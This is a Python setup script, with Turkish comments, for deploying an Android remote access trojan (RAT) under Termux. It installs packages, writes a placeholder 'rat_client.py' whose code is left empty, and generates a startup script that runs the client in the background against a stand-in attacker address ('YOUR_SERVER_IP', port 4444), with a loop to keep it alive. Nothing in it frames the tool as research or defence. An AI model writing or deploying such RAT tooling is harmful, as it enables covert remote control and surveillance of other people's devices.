# rat_termux.py - Termux içinde çalışacak otomatik kurulum scripti
import os
import sys

def install_termux_dependencies():
    print("[+] Installing Termux dependencies...")
    
    commands = [
        "pkg update -y",
        "pkg upgrade -y",
        "pkg install python -y",
        "pkg install python-pip -y",
        "pkg install git -y",
        "pkg install wget -y",
        "pip install requests",
        "pip install androidhelper"
    ]
    
    for cmd in commands:
        print(f"[+] Running: {cmd}")
        os.system(cmd)
    
    print("[+] Dependencies installed")

def setup_rat_client():
    print("[+] Setting up RAT client...")
    
    # rat_client.py'i indir/oluştur
    client_code = '''
# rat_client.py content will be here
'''
    
    with open("rat_client.py", "w") as f:
        f.write(client_code)
    
    print("[+] RAT client script created")

def create_startup_script():
    print("[+] Creating startup script...")
    
    startup_script = '''
#!/data/data/com.termux/files/usr/bin/bash

# Termux RAT Startup Script
SERVER_IP="YOUR_SERVER_IP"
SERVER_PORT=4444

echo "[+] Starting Android RAT Client..."
cd ~/
python3 rat_client.py --server $SERVER_IP --port $SERVER_PORT &

echo "[+] RAT client started in background"
echo "[+] Check connection with: ps aux | grep python"

# Keep Termux alive
while true; do
    sleep 60
done
'''
    
    with open("start_rat.sh", "w") as f:
        f.write(startup_script)
    
    os.system("chmod +x start_rat.sh")
    
    print("[+] Startup script created")
    print("[+] Edit SERVER_IP in start_rat.sh with your server IP")

def main():
    print("\n" + "="*60)
    print("     Android RAT Termux Setup")
    print("="*60)
    
    print("1. Install dependencies")
    print("2. Setup RAT client")
    print("3. Create startup script")
    print("4. Run RAT client")
    print("5. Exit")
    
    choice = input("\nSelect option: ")
    
    if choice == "1":
        install_termux_dependencies()
    elif choice == "2":
        setup_rat_client()
    elif choice == "3":
        create_startup_script()
    elif choice == "4":
        os.system("python3 rat_client.py")
    elif choice == "5":
        sys.exit(0)
    else:
        print("[!] Invalid option")

if __name__ == "__main__":
    main()
